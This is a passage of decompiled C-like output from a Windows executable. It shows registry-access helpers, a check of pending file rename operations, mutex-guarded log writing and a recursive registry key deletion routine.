  uint local_70;
  undefined4 local_6c [25];
  uint local_8;
  
  local_8 = DAT_00435980 ^ (uint)&stack0xfffffffc;
  puVar4 = (undefined4 *)L"SYSTEM\\CurrentControlSet\\Control\\Session Manager";
  puVar5 = local_6c;
  for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    puVar5 = puVar5 + 1;
  }
  uVar3 = 0;
  *(undefined2 *)puVar5 = *(undefined2 *)puVar4;
  local_74 = (HKEY)0x0;
  LVar1 = RegOpenKeyExW((HKEY)0x80000002,(LPCWSTR)local_6c,0,0x20019,&local_74);
  if (LVar1 == 0) {
    local_70 = 0;
    local_7c = 7;
    LVar1 = RegQueryValueExW(local_74,L"PendingFileRenameOperations",(LPDWORD)0x0,&local_7c,
                             (LPBYTE)0x0,&local_70);
    if ((LVar1 == 0) && (local_7c == 7)) {
      lpData = (uint *)FUN_00423836(extraout_ECX,extraout_EDX);
      FUN_00416e80(lpData,0,local_70);
      LVar1 = RegQueryValueExW(local_74,L"PendingFileRenameOperations",(LPDWORD)0x0,(LPDWORD)0x0,
                               (LPBYTE)lpData,&local_70);
      if ((LVar1 == 0) &&
         (((uVar6 = local_70 >> 1, uVar6 - 2 < 0xffffe &&
           (*(short *)((int)lpData + ((local_70 & 0xfffffffe) - 4)) == 0)) &&
          (*(short *)((int)lpData + ((local_70 & 0xfffffffe) - 2)) == 0)))) {
        FUN_00406875(&local_78,(int)L"\\??\\",(int *)(local_78 + 10));
        if (uVar6 != 0) {
          do {
            iVar2 = lstrcmpW((LPCWSTR)((int)lpData + uVar3 * 2),local_78);
            if (iVar2 == 0) break;
            iVar2 = lstrlenW((LPCWSTR)((int)lpData + uVar3 * 2));
            uVar3 = uVar3 + iVar2 + 1;
          } while (uVar3 < uVar6);
        }
        FUN_00401df0((int **)(local_78 + -8));
      }
      FID_conflict__free(lpData);
    }
  }
  uVar7 = FUN_0041a954();
  return uVar7;
}



void FUN_0040667f(void)

{
  return;
}



void __thiscall FUN_00406680(void *this,int param_1)

{
  HMODULE pHVar1;
  longlong lVar2;
  LPCVOID pvVar3;
  undefined4 uVar4;
  DWORD DVar5;
  int iVar6;
  undefined *lpBuffer;
  DWORD *pDVar7;
  LPOVERLAPPED p_Var8;
  DWORD local_14;
  int local_10;
  LPCVOID local_c [2];
  
  if (*(char *)((int)this + 8) == '\0') {
    FUN_004061e0((LPCWSTR)this);
  }
  if ((*(char *)((int)this + 9) != '\0') && (uVar4 = FUN_00406807((int)this), (char)uVar4 != '\0'))
  {
    DVar5 = SetFilePointer(*(HANDLE *)((int)this + 0x18),0,(PLONG)0x0,2);
    lVar2 = (ulonglong)*(uint *)((int)this + 4) * 10;
    if (((int)((ulonglong)lVar2 >> 0x20) != 0) ||
       ((DVar5 < (uint)lVar2 || (uVar4 = FUN_0040646d((DWORD)this), (char)uVar4 != '\0')))) {
      SetFilePointer(*(HANDLE *)((int)this + 0x18),0,(PLONG)0x0,2);
      local_14 = 0;
      pHVar1 = *(HMODULE *)(param_1 + 8);
      if (pHVar1 != (HMODULE)0x0) {
        if (*(char *)((int)this + 0xb) == '\0') {
          FUN_00404cfa(&local_10,pHVar1);
          FUN_00407708((CSimpleStringT_char_0_ *)local_c,&local_10);
          FUN_00401df0((int **)(local_10 + -0x10));
          pvVar3 = local_c[0];
          WriteFile(*(HANDLE *)((int)this + 0x18),local_c[0],*(DWORD *)((int)local_c[0] + -0xc),
                    &local_14,(LPOVERLAPPED)0x0);
          FUN_00401df0((int **)((int)pvVar3 + -0x10));
        }
        else {
          p_Var8 = (LPOVERLAPPED)0x0;
          pDVar7 = &local_14;
          iVar6 = lstrlenW((LPCWSTR)pHVar1);
          WriteFile(*(HANDLE *)((int)this + 0x18),*(LPCVOID *)(param_1 + 8),iVar6 * 2,pDVar7,p_Var8)
          ;
        }
      }
      pHVar1 = *(HMODULE *)(param_1 + 0xc);
      if (pHVar1 != (HMODULE)0x0) {
        if (*(char *)((int)this + 0xb) == '\0') {
          FUN_00404cfa(&local_10,pHVar1);
          FUN_00407708((CSimpleStringT_char_0_ *)local_c,&local_10);
          FUN_00401df0((int **)(local_10 + -0x10));
          WriteFile(*(HANDLE *)((int)this + 0x18),local_c[0],*(DWORD *)((int)local_c[0] + -0xc),
                    &local_14,(LPOVERLAPPED)0x0);
          FUN_00401df0((int **)((int)local_c[0] + -0x10));
        }
        else {
          p_Var8 = (LPOVERLAPPED)0x0;
          pDVar7 = &local_14;
          iVar6 = lstrlenW((LPCWSTR)pHVar1);
          WriteFile(*(HANDLE *)((int)this + 0x18),*(LPCVOID *)(param_1 + 0xc),iVar6 * 2,pDVar7,
                    p_Var8);
        }
      }
      if (*(char *)((int)this + 0xb) == '\0') {
        DVar5 = 2;
        lpBuffer = &DAT_0042fa58;
      }
      else {
        DVar5 = 4;
        lpBuffer = &DAT_0042f748;
      }
      WriteFile(*(HANDLE *)((int)this + 0x18),lpBuffer,DVar5,&local_14,(LPOVERLAPPED)0x0);
      if (*(int *)((int)this + 0x10) != 0) {
        ReleaseMutex(*(HANDLE *)((int)this + 0x10));
      }
    }
  }
  return;
}



uint __fastcall FUN_00406807(int param_1)

{
  uint in_EAX;
  DWORD DVar1;
  LPWSTR lpOutputString;
  uint extraout_EAX;
  undefined4 extraout_ECX;
  int extraout_EDX;
  
  if (*(int *)(param_1 + 0x10) != 0) {
    DVar1 = WaitForSingleObject(*(HANDLE *)(param_1 + 0x10),500);
    if ((DVar1 == 0) || (DVar1 == 0x80)) {
      return CONCAT31((int3)(DVar1 >> 8),1);
    }
    lpOutputString =
         FUN_00408b32(extraout_ECX,extraout_EDX,
                      L"LOG_SYSTEM: [%s]: Could not acquire logging mutex %s\n");
    OutputDebugStringW(lpOutputString);
    *(undefined *)(param_1 + 9) = 0;
    in_EAX = extraout_EAX;
  }
  return in_EAX & 0xffffff00;
}



void __fastcall FUN_00406851(undefined4 param_1,int param_2,undefined4 param_3)

{
  LPWSTR lpOutputString;
  
  lpOutputString = FUN_00408b32(param_1,param_2,L"%s%s\n");
  OutputDebugStringW(lpOutputString);
  return;
}



void * __fastcall FUN_00406875(void *param_1,int param_2,int *param_3)

{
  int iVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  
  piVar3 = (int *)FUN_00402bcc(param_3);
  CSimpleStringT__(param_1,piVar3);
  iVar1 = *param_3;
  iVar2 = *(int *)(iVar1 + -0xc);
  if (param_2 == 0) {
    iVar4 = 0;
  }
  else {
    iVar4 = FUN_0041c12a(extraout_ECX,extraout_DX);
  }
  FUN_00404f9f(param_1,iVar4,iVar1,iVar2);
  return param_1;
}



void __cdecl FUN_004068c0(int *param_1,LPCWSTR param_2)

{
  int iVar1;
  code *pcVar2;
  int iVar3;
  char *pcVar4;
  int iVar5;
  undefined8 uVar6;
  long lVar7;
  
  if (param_2 == (LPCWSTR)0x0) {
    lVar7 = -0x7ff8ffa9;
  }
  else {
    iVar1 = *(int *)(*param_1 + -0xc);
    uVar6 = FUN_004030e0(param_2,&stack0x0000000c);
    iVar3 = (int)uVar6;
    if (-1 < iVar3) {
      iVar5 = iVar1 + iVar3;
      pcVar4 = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)param_1,iVar5);
      FUN_0040303b(pcVar4 + iVar1 * 2,iVar3 + 1,param_2,&stack0x0000000c);
      ATL::CSimpleStringT<wchar_t,0>::SetLength((CSimpleStringT_wchar_t_0_ *)param_1,iVar5);
      return;
    }
    lVar7 = -0x7fffbffb;
  }
  ATL::AtlThrowImpl(lVar7);
  pcVar2 = (code *)swi(3);
  (*pcVar2)();
  return;
}



undefined4 * __thiscall FUN_0040692c(void *this,byte param_1)

{
  *(undefined ***)this = &PTR_FUN_0042fae8;
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_0040694c(void)

{
  HMODULE pHVar1;
  undefined8 uVar2;
  
  if ((DAT_00437b74 == 0) || (_DAT_00437b70 == 0)) {
    uVar2 = FUN_00407d59();
    if ((char)uVar2 != '\0') {
      pHVar1 = GetModuleHandleW(L"kernel32.dll");
      if (pHVar1 != (HMODULE)0x0) {
        FUN_00406b1b(pHVar1,"CreateMutexExW",(FARPROC *)&DAT_00437b74);
        FUN_00406b1b(pHVar1,"CreateEventExW",(FARPROC *)&DAT_00437b70);
      }
    }
  }
  return;
}



void __fastcall FUN_004069a2(LPCWSTR param_1,LPSECURITY_ATTRIBUTES param_2)

{
  FUN_0040694c();
  if (DAT_00437b74 == (code *)0x0) {
    CreateMutexW(param_2,0,param_1);
  }
  else {
    (*DAT_00437b74)(param_2,param_1,0,0x100001);
  }
  return;
}



undefined * __thiscall FUN_004069d2(void *this,int *param_1)

{
  *(undefined *)this = 1;
  *(int **)((int)this + 4) = param_1;
  (**(code **)(*param_1 + 4))();
  return (undefined *)this;
}



undefined4 * __thiscall FUN_004069ed(void *this,byte param_1)

{
  FUN_00406a0c((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00406a0c(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042fad8;
  if (param_1[1] != 0) {
    CloseHandle((HANDLE)param_1[1]);
  }
  *param_1 = &PTR_FUN_0042fae8;
  return;
}



void __fastcall FUN_00406a2c(int *param_1)

{
  (**(code **)(*param_1 + 0xc))(0xffffffff);
  return;
}



bool __thiscall FUN_00406a34(void *this,DWORD param_1)

{
  DWORD DVar1;
  
  DVar1 = WaitForSingleObject(*(HANDLE *)((int)this + 4),param_1);
  return DVar1 == 0 || DVar1 == 0x80;
}



uint __fastcall FUN_00406a57(int param_1)

{
  uint uVar1;
  
  uVar1 = ReleaseMutex(*(HANDLE *)(param_1 + 4));
  return uVar1 & 0xffffff00 | (uint)(uVar1 != 0);
}



undefined4 * __fastcall FUN_00406a66(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042fac8;
  InitializeCriticalSection((LPCRITICAL_SECTION)(param_1 + 1));
  return param_1;
}



undefined4 * __thiscall FUN_00406a7d(void *this,byte param_1)

{
  FUN_00406a9c((undefined4 *)this);
  if ((param_1 & 1) != 0) {
    FID_conflict__free(this);
  }
  return (undefined4 *)this;
}



void __fastcall FUN_00406a9c(undefined4 *param_1)

{
  *param_1 = &PTR_FUN_0042fac8;
  DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 1));
  *param_1 = &PTR_FUN_0042fae8;
  return;
}



undefined FUN_00406ac1(void)

{
  return 1;
}



uint __thiscall FUN_00406ac4(void *this,uint param_1)

{
  BOOL BVar1;
  DWORD DVar2;
  DWORD DVar3;
  uint uVar4;
  
  BVar1 = TryEnterCriticalSection((LPCRITICAL_SECTION)((int)this + 4));
  if (BVar1 == 0) {
    DVar2 = GetTickCount();
    do {
      Sleep(0);
      BVar1 = TryEnterCriticalSection((LPCRITICAL_SECTION)((int)this + 4));
      if (BVar1 != 0) goto LAB_00406b05;
      DVar3 = GetTickCount();
    } while (DVar3 - DVar2 < param_1);
    uVar4 = DVar3 - DVar2 & 0xffffff00;
  }
  else {
LAB_00406b05:
    uVar4 = CONCAT31((int3)((uint)BVar1 >> 8),1);
  }
  return uVar4;
}



uint __fastcall FUN_00406b1b(HMODULE param_1,LPCSTR param_2,FARPROC *param_3)

{
  uint in_EAX;
  FARPROC pFVar1;
  uint uVar2;
  
  if (((param_1 == (HMODULE)0x0) || (param_3 == (FARPROC *)0x0)) || (param_2 == (LPCSTR)0x0)) {
    uVar2 = in_EAX & 0xffffff00;
  }
  else {
    pFVar1 = GetProcAddress(param_1,param_2);
    *param_3 = pFVar1;
    uVar2 = (uint)pFVar1 & 0xffffff00 | (uint)(pFVar1 != (FARPROC)0x0);
  }
  return uVar2;
}



uint __thiscall FUN_00406b46(void *this,LPCWSTR param_1)

{
  uint uVar1;
  
  uVar1 = RegDeleteKeyW(*(HKEY *)((int)this + 4),param_1);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  if ((uVar1 == 0x80070002) || (uVar1 == 0x80070003)) {
    uVar1 = 1;
  }
  return uVar1;
}



uint __thiscall FUN_00406b76(void *this,LPCWSTR param_1)

{
  uint uVar1;
  
  uVar1 = RegDeleteValueW(*(HKEY *)((int)this + 4),param_1);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  if ((uVar1 == 0x80070002) || (uVar1 == 0x80070003)) {
    uVar1 = 1;
  }
  return uVar1;
}



uint __fastcall FUN_00406ba6(int param_1)

{
  uint uVar1;
  
  uVar1 = 0;
  if (*(int *)(param_1 + 4) != 0) {
    uVar1 = RegCloseKey(*(HKEY *)(param_1 + 4));
    if (0 < (int)uVar1) {
      uVar1 = uVar1 & 0xffff | 0x80070000;
    }
    *(undefined4 *)(param_1 + 4) = 0;
  }
  return uVar1;
}



uint __thiscall
FUN_00406bcb(void *this,HKEY param_1,LPCWSTR param_2,undefined4 param_3,undefined4 param_4,
            REGSAM param_5,undefined4 param_6,int **param_7)

{
  uint uVar1;
  int *local_c;
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  local_c = (int *)this;
  uVar1 = RegCreateKeyExW(param_1,param_2,0,(LPWSTR)0x0,0,param_5,(LPSECURITY_ATTRIBUTES)0x0,
                          &local_8,(LPDWORD)&local_c);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  if (param_7 != (int **)0x0) {
    *param_7 = local_c;
  }
  if (uVar1 == 0) {
                    // WARNING: Load size is inaccurate
    uVar1 = (**(code **)(*this + 4))();
    *(HKEY *)((int)this + 4) = local_8;
  }
  return uVar1;
}



uint __thiscall
FUN_00406c2a(void *this,HMODULE param_1,undefined4 param_2,undefined4 param_3,REGSAM param_4,
            undefined4 param_5,int **param_6)

{
  HMODULE pHVar1;
  HKEY pHVar2;
  undefined4 extraout_ECX;
  uint uVar3;
  
  FUN_00404cfa(&param_1,param_1);
  pHVar2 = (HKEY)FUN_0040739c((short **)&param_1);
  pHVar1 = param_1;
  if (pHVar2 == (HKEY)0x0) {
    uVar3 = 0x80070273;
  }
  else {
    uVar3 = FUN_00406bcb(this,pHVar2,(LPCWSTR)param_1,extraout_ECX,extraout_ECX,param_4,extraout_ECX
                         ,param_6);
  }
  FUN_00401df0((int **)(pHVar1 + -4));
  return uVar3;
}



void __thiscall FUN_00406c76(void *this,HKEY param_1,LPCWSTR param_2,REGSAM param_3)

{
  uint uVar1;
  HKEY local_8;
  
  local_8 = (HKEY)0x0;
  uVar1 = RegOpenKeyExW(param_1,param_2,0,param_3,&local_8);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  if (uVar1 == 0) {
                    // WARNING: Load size is inaccurate
    (**(code **)(*this + 4))();
    *(HKEY *)((int)this + 4) = local_8;
  }
  return;
}



undefined4 __thiscall FUN_00406cba(void *this,HMODULE param_1,REGSAM param_2)

{
  HMODULE pHVar1;
  HKEY pHVar2;
  undefined4 uVar3;
  
  FUN_00404cfa(&param_1,param_1);
  pHVar2 = (HKEY)FUN_0040739c((short **)&param_1);
  pHVar1 = param_1;
  if (pHVar2 == (HKEY)0x0) {
    uVar3 = 0x80070273;
  }
  else {
    uVar3 = FUN_00406c76(this,pHVar2,(LPCWSTR)param_1,param_2);
  }
  FUN_00401df0((int **)(pHVar1 + -4));
  return uVar3;
}



uint __fastcall
FUN_00406d00(HMODULE param_1,LPCWSTR param_2,int param_3,int **param_4,DWORD *param_5)

{
  LPCWSTR pWVar1;
  HKEY pHVar2;
  uint uVar3;
  uint uVar4;
  undefined **local_1c;
  HKEY local_18;
  DWORD local_14;
  HMODULE local_10;
  LPCWSTR local_c [2];
  
  uVar4 = 0x80070003;
  FUN_00404cfa(local_c,param_1);
  pHVar2 = (HKEY)FUN_0040739c(local_c);
  pWVar1 = local_c[0];
  if (pHVar2 != (HKEY)0x0) {
    local_18 = (HKEY)0x0;
    local_1c = &PTR_FUN_0042f170;
    uVar4 = FUN_00406c76(&local_1c,pHVar2,local_c[0],0x20019);
    if (uVar4 == 0) {
      if (param_3 == 1) {
        uVar4 = FUN_00406ef8(&local_1c,param_2,param_4);
      }
      else if (param_3 == 3) {
        local_14 = 0;
        uVar4 = FUN_00406e46(&local_1c,param_2,&local_14,param_4,param_5);
      }
      else if (param_3 == 4) {
        uVar4 = FUN_00406ebd(&local_1c,param_2,param_4);
      }
      else if (param_3 == 7) {
        local_c[0] = (LPCWSTR)0x0;
        local_14 = 0;
        local_10 = (HMODULE)0x0;
        uVar4 = FUN_00406e46(&local_1c,param_2,&local_14,&local_10,(DWORD *)local_c);
        if (-1 < (int)uVar4) {
          uVar4 = FUN_00407035(local_10,(uint)local_c[0],param_4);
        }
      }
      else if (param_3 == 0xb) {
        local_c[0] = (LPCWSTR)0x0;
        local_10 = (HMODULE)&DAT_00000008;
        uVar4 = SHQueryValueExW(local_18,param_2,(DWORD *)0x0,(DWORD *)local_c,param_4,
                                (DWORD *)&local_10);
        if (0 < (int)uVar4) {
          uVar4 = uVar4 & 0xffff | 0x80070000;
        }
      }
      else {
        uVar4 = 0x8007065d;
      }
      uVar3 = FUN_00406ba6((int)&local_1c);
      if (uVar4 == 0) {
        uVar4 = uVar3;
      }
    }
    local_1c = &PTR_FUN_0042f170;
    FUN_00406ba6((int)&local_1c);
  }
  FUN_00401df0((int **)(pWVar1 + -8));
  return uVar4;
}



uint __thiscall
FUN_00406e46(void *this,LPCWSTR param_1,DWORD *param_2,void **param_3,DWORD *param_4)

{
  void **ppvVar1;
  uint uVar2;
  void *pvData;
  undefined4 extraout_ECX;
  int extraout_EDX;
  
  ppvVar1 = param_3;
  *param_3 = (void *)0x0;
  param_3 = (void **)0x0;
  uVar2 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,param_2,(void *)0x0,
                          (DWORD *)&param_3);
  if (0 < (int)uVar2) {
    uVar2 = uVar2 & 0xffff | 0x80070000;
  }
  if ((uVar2 == 0) && (param_3 != (void **)0x0)) {
    pvData = (void *)FUN_00423836(extraout_ECX,extraout_EDX);
    *ppvVar1 = pvData;
    uVar2 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,param_2,pvData,
                            (DWORD *)&param_3);
    if (0 < (int)uVar2) {
      uVar2 = uVar2 & 0xffff | 0x80070000;
    }
  }
  *param_4 = (DWORD)param_3;
  return uVar2;
}



uint __thiscall FUN_00406ebd(void *this,LPCWSTR param_1,void *param_2)

{
  uint uVar1;
  DWORD local_c;
  DWORD local_8;
  
  local_c = 0;
  local_8 = 4;
  uVar1 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,&local_c,param_2,&local_8);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  return uVar1;
}



uint __thiscall FUN_00406ef8(void *this,LPCWSTR param_1,undefined4 *param_2)

{
  longlong lVar1;
  uint uVar2;
  undefined2 *pvData;
  int iVar3;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  local_c = 0;
  uVar2 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,&local_c,(void *)0x0,
                          &local_8);
  if (0 < (int)uVar2) {
    uVar2 = uVar2 & 0xffff | 0x80070000;
  }
  if (uVar2 == 0) {
    lVar1 = (ulonglong)((local_8 >> 1) + 1) * 2;
    iVar3 = (int)((ulonglong)lVar1 >> 0x20);
    pvData = (undefined2 *)FUN_00423836(-(uint)(iVar3 != 0) | (uint)lVar1,iVar3);
    *param_2 = pvData;
    if (pvData == (undefined2 *)0x0) {
      uVar2 = 0x8007000e;
    }
    else if (local_8 == 0) {
      *pvData = 0;
    }
    else {
      uVar2 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,&local_c,pvData,&local_8
                             );
      if (0 < (int)uVar2) {
        uVar2 = uVar2 & 0xffff | 0x80070000;
      }
    }
  }
  return uVar2;
}



uint __thiscall FUN_00406f9c(void *this,LPCWSTR param_1,int *param_2)

{
  uint uVar1;
  char *pvData;
  int extraout_EDX;
  int extraout_EDX_00;
  int iVar2;
  DWORD local_c;
  uint local_8;
  
  local_8 = 0;
  local_c = 0;
  uVar1 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,&local_c,(void *)0x0,
                          &local_8);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  if (uVar1 == 0) {
    if (local_8 == 0) {
      FUN_00401ba1(param_2);
    }
    else {
      pvData = ATL::CSimpleStringT<char,0>::PrepareWrite
                         ((CSimpleStringT_char_0_ *)param_2,(local_8 >> 1) + 1);
      if (pvData == (char *)0x0) {
        uVar1 = 0x8007000e;
        iVar2 = extraout_EDX;
      }
      else {
        uVar1 = SHQueryValueExW(*(HKEY *)((int)this + 4),param_1,(DWORD *)0x0,&local_c,pvData,
                                &local_8);
        iVar2 = extraout_EDX_00;
        if (0 < (int)uVar1) {
          uVar1 = uVar1 & 0xffff | 0x80070000;
        }
      }
      ReleaseBuffer(param_2,iVar2,-1);
    }
  }
  return uVar1;
}



undefined4 __fastcall FUN_00407035(HMODULE param_1,uint param_2,int **param_3)

{
  int iVar1;
  HMODULE local_8;
  
  local_8 = param_1;
  FUN_00402b6e(param_3);
  if (1 < param_2 >> 1) {
    if ((*(short *)((int)param_1 + ((param_2 & 0xfffffffe) - 2)) != 0) ||
       (*(short *)((int)&param_1[-1].unused + (param_2 & 0xfffffffe)) != 0)) {
      return 0x80070057;
    }
    for (; *(short *)&param_1->unused != 0;
        param_1 = (HMODULE)((int)&param_1->unused + iVar1 * 2 + 2)) {
      FUN_00404cfa(&local_8,param_1);
      FUN_00402b0e(param_3,(int *)&local_8);
      iVar1 = local_8[-3].unused;
      FUN_00401df0((int **)(local_8 + -4));
    }
  }
  return 0;
}



uint __thiscall FUN_0040709d(void *this,LPCWSTR param_1)

{
  uint uVar1;
  
  uVar1 = RegSetValueExW(*(HKEY *)((int)this + 4),param_1,0,4,&stack0x00000008,4);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  return uVar1;
}



uint __thiscall FUN_004070c6(void *this,LPCWSTR param_1,LPCWSTR param_2,DWORD param_3)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = lstrlenW(param_2);
  uVar2 = RegSetValueExW(*(HKEY *)((int)this + 4),param_1,0,param_3,(BYTE *)param_2,iVar1 * 2 + 2);
  if (0 < (int)uVar2) {
    uVar2 = uVar2 & 0xffff | 0x80070000;
  }
  return uVar2;
}



// WARNING: Removing unreachable block (ram,0x0040710b)

uint __thiscall FUN_00407102(void *this,LPCWSTR param_1,BYTE *param_2,DWORD param_3,DWORD param_4)

{
  uint uVar1;
  
  uVar1 = RegSetValueExW(*(HKEY *)((int)this + 4),param_1,0,param_4,param_2,param_3);
  if (0 < (int)uVar1) {
    uVar1 = uVar1 & 0xffff | 0x80070000;
  }
  return uVar1;
}



uint __fastcall FUN_00407139(HMODULE param_1)

{
  HMODULE pHVar1;
  HKEY pHVar2;
  int iVar3;
  uint uVar4;
  bool bVar5;
  HMODULE local_c;
  HMODULE local_8;
  
  local_c = param_1;
  local_8 = param_1;
  FUN_00404cfa(&local_8,param_1);
  pHVar2 = (HKEY)FUN_0040739c((short **)&local_8);
  pHVar1 = local_8;
  if (pHVar2 == (HKEY)0x0) {
    bVar5 = false;
  }
  else {
    local_8 = (HMODULE)0x0;
    local_c = (HMODULE)&PTR_FUN_0042f170;
    iVar3 = FUN_00406c76(&local_c,pHVar2,(LPCWSTR)pHVar1,0x20019);
    FUN_00406ba6((int)&local_c);
    local_c = (HMODULE)&PTR_FUN_0042f170;
    FUN_00406ba6((int)&local_c);
    bVar5 = iVar3 == 0;
  }
  uVar4 = FUN_00401df0((int **)(pHVar1 + -4));
  return uVar4 & 0xffffff00 | (uint)bVar5;
}



uint __fastcall FUN_004071a3(HMODULE param_1,LPCWSTR param_2)

{
  HKEY pHVar1;
  HKEY pHVar2;
  int iVar3;
  LSTATUS LVar4;
  uint uVar5;
  uint uVar6;
  undefined **local_c;
  HKEY local_8;
  
  uVar6 = 0;
  FUN_00404cfa(&local_8,param_1);
  pHVar2 = (HKEY)FUN_0040739c((short **)&local_8);
  pHVar1 = local_8;
  if (pHVar2 != (HKEY)0x0) {
    local_c = &PTR_FUN_0042f170;
    local_8 = (HKEY)0x0;
    iVar3 = FUN_00406c76(&local_c,pHVar2,(LPCWSTR)pHVar1,0x20019);
    if (iVar3 == 0) {
      LVar4 = RegQueryValueExW(local_8,param_2,(LPDWORD)0x0,(LPDWORD)0x0,(LPBYTE)0x0,(LPDWORD)0x0);
      uVar6 = (byte)-(LVar4 != 0) + 1;
      FUN_00406ba6((int)&local_c);
    }
    local_c = &PTR_FUN_0042f170;
    FUN_00406ba6((int)&local_c);
  }
  uVar5 = FUN_00401df0((int **)(pHVar1 + -4));
  return uVar5 & 0xffffff00 | uVar6 & 0xff;
}



int __fastcall FUN_00407222(HMODULE param_1)

{
  HKEY pHVar1;
  int iVar2;
  undefined8 uVar3;
  undefined **local_14;
  undefined4 local_10;
  LPCWSTR local_c;
  LPCWSTR local_8;
  
  FUN_00404cfa(&local_8,param_1);
  pHVar1 = (HKEY)FUN_0040739c(&local_8);
  FUN_004074df(&local_c,&local_8);
  local_10 = 0;
  local_14 = &PTR_FUN_0042f170;
  iVar2 = FUN_00406c76(&local_14,pHVar1,local_c,0xf003f);
  if (iVar2 == 0) {
    uVar3 = FUN_004072bf(&local_14,local_8);
    iVar2 = (int)uVar3;
  }
  else if ((iVar2 == -0x7ff8fffe) || (iVar2 == -0x7ff8fffd)) {
    iVar2 = 1;
  }
  FUN_00406ba6((int)&local_14);
  local_14 = &PTR_FUN_0042f170;
  FUN_00406ba6((int)&local_14);
  FUN_00401df0((int **)(local_c + -8));
  FUN_00401df0((int **)(local_8 + -8));
  return iVar2;
}



undefined8 __thiscall FUN_004072bf(void *this,LPCWSTR param_1)

{
  int iVar1;
  LSTATUS LVar2;
  undefined8 uVar3;
  _FILETIME local_224;
  DWORD local_21c;
  undefined **local_218;
  HKEY local_214;
  WCHAR local_210 [258];
  uint local_c;
  
  local_c = DAT_00435980 ^ (uint)&stack0xfffffffc;
  local_214 = (HKEY)0x0;
  local_218 = &PTR_FUN_0042f170;
  iVar1 = FUN_00406c76(&local_218,*(HKEY *)((int)this + 4),param_1,0xf003f);
  if ((iVar1 == -0x7ff8fffe) || (iVar1 == -0x7ff8fffd)) {
    iVar1 = 1;
  }
  do {
    if (iVar1 != 0) {
LAB_00407372:
      local_218 = &PTR_FUN_0042f170;
      FUN_00406ba6((int)&local_218);
      uVar3 = FUN_0041a954();
      return uVar3;
    }
    local_21c = 0x100;
    LVar2 = RegEnumKeyExW(local_214,0,local_210,&local_21c,(LPDWORD)0x0,(LPWSTR)0x0,(LPDWORD)0x0,
                          &local_224);
    if (LVar2 != 0) {
      FUN_00406ba6((int)&local_218);
      FUN_00406b46(this,param_1);
      goto LAB_00407372;
    }
    uVar3 = FUN_004072bf(&local_218,local_210);
    iVar1 = (int)uVar3;
  } while( true );
}



undefined4 __fastcall FUN_0040739c(short **param_1)

{
  int iVar1;
  int *piVar2;
  undefined2 extraout_DX;
  undefined4 uVar3;
  short **local_c;
  short **local_8;
  
  uVar3 = 0;
  local_c = param_1;
  local_8 = param_1;
  iVar1 = FUN_00407a34(*param_1,0x5c);
  piVar2 = (int *)FUN_0040139e();
  CSimpleStringT__(&local_8,piVar2);
  if (iVar1 == -1) {
    FUN_00401b2a(&local_8,(int *)param_1);
    FUN_00404d7b(param_1,extraout_DX,(int)&DAT_0042f178);
  }
  else {
    piVar2 = FUN_00402958(param_1,(int *)&local_c,iVar1);
    FUN_00401b2a(&local_8,piVar2);
    FUN_00401df0((int **)(local_c + -4));
    piVar2 = FUN_0040290f(param_1,(int *)&local_c,(*(int *)(*param_1 + -6) - iVar1) + -1);
    FUN_00401b2a(param_1,piVar2);
    FUN_00401df0((int **)(local_c + -4));
  }
  iVar1 = FUN_00402858(&local_8,L"HKLM");
  if (iVar1 != 0) {
    iVar1 = FUN_00402858(&local_8,L"HKEY_LOCAL_MACHINE");
    if (iVar1 != 0) {
      iVar1 = FUN_00402858(&local_8,L"HKCU");
      if (iVar1 != 0) {
        iVar1 = FUN_00402858(&local_8,L"HKEY_CURRENT_USER");
        if (iVar1 != 0) {
          iVar1 = FUN_00402858(&local_8,L"HKU");
          if (iVar1 != 0) {
            iVar1 = FUN_00402858(&local_8,L"HKEY_USERS");
            if (iVar1 != 0) {
              iVar1 = FUN_00402858(&local_8,L"HKCR");
              if (iVar1 != 0) {
                iVar1 = FUN_00402858(&local_8,L"HKEY_CLASSES_ROOT");
                if (iVar1 != 0) goto LAB_004074cb;
              }
              uVar3 = 0x80000000;
              goto LAB_004074cb;
            }
          }
          uVar3 = 0x80000003;
          goto LAB_004074cb;
        }
      }
      uVar3 = 0x80000001;
      goto LAB_004074cb;
    }
  }
  uVar3 = 0x80000002;
LAB_004074cb:
  FUN_00401df0((int **)(local_8 + -4));
  return uVar3;
}



void * __fastcall FUN_004074df(void *param_1,short **param_2)

{
  int iVar1;
  int *piVar2;
  undefined2 extraout_DX;
  void *local_8;
  
  local_8 = param_1;
  iVar1 = FUN_00407602(param_2,(short)param_2,0x5c);
  piVar2 = (int *)FUN_0040139e();
